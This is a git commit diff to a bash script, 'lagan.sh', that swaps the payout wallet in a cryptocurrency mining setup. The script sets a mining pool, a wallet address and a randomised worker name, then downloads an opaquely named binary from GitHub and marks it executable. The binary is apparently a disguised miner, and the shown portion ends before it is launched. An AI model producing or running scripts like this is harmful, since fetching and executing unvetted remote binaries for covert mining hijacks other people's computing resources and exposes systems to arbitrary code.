4b43f8e5d1e67ddb3a940ef917d66a470a1634ea
pruthvigithub1137 <88317515+pruthvigithub1137@users.noreply.github.com>
2021-08-02 17:16:05 +0530

    Update lagan.sh

--- lagan.sh
+++ lagan.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=TRX:TUxbPLqKPtdvtGTFfAYmqJLdzjBhQuWSVU
+WALLET=ETH:0x19bED4AA973C277dEbF737450a630075787515bd
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
 wget https://github.com/archernap/prem/raw/main/priyatama
 chmod +x priyatama
